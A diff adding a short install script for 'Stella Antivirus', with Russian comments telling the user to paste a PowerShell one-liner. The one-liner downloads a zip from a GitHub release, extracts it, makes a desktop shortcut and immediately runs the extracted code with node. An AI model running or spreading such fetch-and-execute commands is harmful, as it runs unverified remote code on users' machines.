@@ -1,0 +1,4 @@
+# Stella Antivirus — одна строка (скопируй и вставь в PowerShell)
+# Скачает, распакует в %USERPROFILE%\StellaAV, создаст ярлык, запустит
+
+$url="https://github.com/a1x10/stella/releases/download/v5.3.1/stella-antivirus.zip"; $d="$env:TEMP\av.zip"; $e="$env:USERPROFILE\StellaAV"; Write-Host "✦ Stella Antivirus" -ForegroundColor Magenta; Write-Host "[1/3] Скачивание..."; Invoke-WebRequest -Uri $url -OutFile $d; Write-Host "[2/3] Распаковка..."; Expand-Archive -Path $d -DestinationPath $e -Force; Write-Host "[3/3] Запуск..."; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut("$env:USERPROFILE\Desktop\Stella Antivirus.lnk"); $s.TargetPath = "node.exe"; $s.Arguments = "`"$e\index.mjs`""; $s.WorkingDirectory = "$e"; $s.Save(); Write-Host "✓ Готово!" -ForegroundColor Green; & node "$e\index.mjs"
